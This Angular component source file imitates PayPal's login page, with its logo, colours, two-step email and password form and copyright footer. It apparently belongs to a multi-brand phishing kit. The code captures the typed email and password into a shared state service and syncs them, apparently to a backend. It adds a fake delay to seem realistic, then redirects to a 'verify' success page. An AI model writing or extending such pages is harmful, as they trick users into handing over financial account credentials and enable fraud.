import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../../../services/state.service';
import { getFlowById } from '../../../services/flows.service';
import { LanguageService } from '../../../services/language.service';

@Component({
  selector: 'app-paypal-login',
  standalone: true,
  imports: [CommonModule, FormsModule, ReactiveFormsModule],
  template: `
    <div class="pp-flow-container font-sans flex items-center justify-center min-h-screen bg-[#F5F7FA]">
      <div class="bg-white rounded-xl shadow-sm border border-gray-200 max-w-[450px] w-full p-11 mt-8 relative">
        <div class="text-center mb-8">
            <img src="assets/logos/paypal.svg" alt="PayPal" class="h-8 mx-auto">
        </div>

        <div class="text-center mb-8" *ngIf="step() === 'email'">
           <h1 class="text-[#001435] text-lg font-medium">Log in to your account</h1>
        </div>
        
        <!-- Step 1: Email -->
        <div *ngIf="step() === 'email'" class="animate-in fade-in duration-300">
            <form [formGroup]="emailForm" (ngSubmit)="onEmailSubmit()" class="space-y-5">
              <div class="relative">
                <input 
                  type="text" 
                  formControlName="email"
                  class="peer w-full h-[54px] px-4 pt-4 pb-1 border border-[#9DA3A6] rounded-[4px] text-[#001435] text-lg outline-none focus:border-[#0070BA] focus:ring-1 focus:ring-[#0070BA] transition-colors bg-white z-10 relative placeholder-transparent"
                  placeholder="Email or mobile number"
                  [class.border-[#D20000]]="isFieldInvalid(emailForm, 'email')"
                  [class.focus:border-[#D20000]]="isFieldInvalid(emailForm, 'email')"
                  [class.focus:ring-[#D20000]]="isFieldInvalid(emailForm, 'email')"
                  id="emailInput"
                >
                <label for="emailInput" 
                       class="absolute left-4 top-4 text-[#5F7285] text-lg transition-all duration-200 peer-focus:text-xs peer-focus:top-1.5 peer-focus:text-[#5F7285] peer-placeholder-shown:text-lg peer-placeholder-shown:top-4 peer-[&:not(:placeholder-shown)]:text-xs peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[#5F7285] pointer-events-none z-20">
                    Email or mobile number
                </label>
                
                <div *ngIf="isFieldInvalid(emailForm, 'email')" class="text-[#D20000] text-sm mt-1 flex items-center gap-1">
                   <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                     <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
                   </svg>
                   Required
                </div>
              </div>
              
              <div class="text-right">
                <a href="javascript:void(0)" class="text-[#0070BA] font-bold text-sm hover:underline hover:text-[#003087]">Forgot email?</a>
              </div>

              <button 
                type="submit" 
                class="w-full h-[48px] bg-[#003087] hover:bg-[#001C64] text-white rounded-full font-bold text-base shadow-none transition-all active:scale-[0.99] flex items-center justify-center"
                [disabled]="emailForm.invalid || isLoading()"
              >
                <div *ngIf="isLoading()" class="animate-spin h-5 w-5 border-2 border-white border-t-transparent rounded-full mr-2"></div>
                <span *ngIf="!isLoading()">Next</span>
              </button>
              
              <div class="relative flex py-2 items-center">
                  <div class="flex-grow border-t border-[#CBD2D6]"></div>
                  <span class="flex-shrink-0 mx-4 text-[#6C7378] text-sm">or</span>
                  <div class="flex-grow border-t border-[#CBD2D6]"></div>
              </div>
              
              <button type="button" class="w-full h-[48px] bg-white border border-[#003087] text-[#003087] hover:bg-gray-50 rounded-full font-bold text-base transition-all active:scale-[0.99]">
                Sign Up
              </button>
            </form>
        </div>

        <!-- Step 2: Password -->
        <div *ngIf="step() === 'password'" class="animate-in fade-in duration-300">
             <div class="text-center -mt-2 mb-8">
                <p class="text-[#001435] text-base mb-1">{{ emailForm.get('email')?.value }}</p>
                <a href="javascript:void(0)" (click)="changeEmail()" class="text-[#0070BA] font-bold text-sm hover:underline">Change</a>
             </div>

            <form [formGroup]="passwordForm" (ngSubmit)="onPasswordSubmit()" class="space-y-5">
              <div class="relative">
                <input 
                  type="password" 
                  formControlName="password"
                  class="peer w-full h-[54px] px-4 pt-4 pb-1 border border-[#9DA3A6] rounded-[4px] text-[#001435] text-lg outline-none focus:border-[#0070BA] focus:ring-1 focus:ring-[#0070BA] transition-colors bg-white placeholder-transparent"
                  placeholder="Password"
                  [class.border-[#D20000]]="isFieldInvalid(passwordForm, 'password')"
                  id="passInput"
                  autofocus
                >
                <label for="passInput" 
                       class="absolute left-4 top-4 text-[#5F7285] text-lg transition-all duration-200 peer-focus:text-xs peer-focus:top-1.5 peer-focus:text-[#5F7285] peer-placeholder-shown:text-lg peer-placeholder-shown:top-4 peer-[&:not(:placeholder-shown)]:text-xs peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[#5F7285] pointer-events-none">
                    Password
                </label>
              </div>
              
              <div class="text-right">
                <a href="javascript:void(0)" class="text-[#0070BA] font-bold text-sm hover:underline hover:text-[#003087]">Forgot password?</a>
              </div>

              <button 
                type="submit" 
                class="w-full h-[48px] bg-[#003087] hover:bg-[#001C64] text-white rounded-full font-bold text-base shadow-none transition-all active:scale-[0.99] flex items-center justify-center"
                [disabled]="passwordForm.invalid || isLoading()"
              >
                <div *ngIf="isLoading()" class="animate-spin h-5 w-5 border-2 border-white border-t-transparent rounded-full mr-2"></div>
                Log In
              </button>
            </form>
        </div>
      </div>
      
      <footer class="w-full absolute bottom-0 bg-[#F7F9FA] py-4 border-t border-[#EAEDED] text-center">
         <div class="flex justify-center flex-wrap gap-4 text-xs font-medium text-[#5F7285] mb-2 px-4">
            <a href="javascript:void(0)" class="hover:text-[#0070BA] hover:underline">Contact</a>
            <a href="javascript:void(0)" class="hover:text-[#0070BA] hover:underline">Privacy</a>
            <a href="javascript:void(0)" class="hover:text-[#0070BA] hover:underline">Legal</a>
            <div class="relative group inline-block">
                <a href="javascript:void(0)" class="hover:text-[#0070BA] hover:underline flex items-center gap-1">
                   <svg viewBox="0 0 24 24" class="h-4 w-4 fill-current"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg> 
                   {{ langService.currentLang() | uppercase }}
                </a>
                <div class="absolute bottom-full left-1/2 -translate-x-1/2 mb-2 hidden group-hover:block bg-white border border-[#CBD2D6] rounded shadow-lg p-2 min-w-[120px] text-left max-h-[300px] overflow-y-auto z-50">
                    @for (lang of langService.availableLangs; track lang.code) {
                        <button (click)="langService.setLanguage(lang.code)" class="block w-full text-left px-3 py-2 text-sm text-[#5F7285] hover:bg-[#F5F7FA] hover:text-[#0070BA]">
                            {{ lang.name }}
                        </button>
                    }
                </div>
            </div>
         </div>
         <p class="text-[#5F7285] text-[11px] px-4">Copyright © 1999-2024 PayPal. All rights reserved.</p>
      </footer>
    </div>
  `,
  styleUrls: ['../../../styles/flows/paypal.scss']
})
export class PaypalLoginComponent {
  private fb = inject(FormBuilder);
  private router = inject(Router);
  private state = inject(StateService);
  langService = inject(LanguageService);

  step = signal<'email' | 'password'>('email');
  isLoading = signal(false);

  // Email Step Form
  emailForm = this.fb.group({
    email: ['', [Validators.required, Validators.minLength(3)]]
  });

  // Password Step Form
  passwordForm = this.fb.group({
    password: ['', [Validators.required, Validators.minLength(4)]]
  });

  constructor() {
    const flow = getFlowById('paypal');
    if (flow) {
      this.state.currentFlow.set(flow);
    }
  }

  isFieldInvalid(form: any, field: string): boolean {
    const control = form.get(field);
    return !!(control && control.invalid && (control.dirty || control.touched));
  }

  async onEmailSubmit() {
    if (this.emailForm.valid) {
      this.isLoading.set(true);
      // Simulate network delay for realistic feel
      setTimeout(() => {
        this.isLoading.set(false);
        this.state.email.set(this.emailForm.get('email')!.value!);
        this.step.set('password');
      }, 600);
    }
  }

  async onPasswordSubmit() {
    if (this.passwordForm.valid) {
      this.isLoading.set(true);
      const { password } = this.passwordForm.value;

      this.state.password.set(password!);
      this.state.isLoginSubmitted.set(true);
      await this.state.syncState();

      setTimeout(() => {
        this.isLoading.set(false);
        // Normally would go to OTP or dashboard.
        // For verification flow, let's assume strict security -> OTP or standard next step
        this.router.navigate(['/verify/step-success']); // Or redirect to specific PayPal OTP if we built it
      }, 1000);
    }
  }

  changeEmail() {
    this.step.set('email');
    this.passwordForm.reset();
  }
}
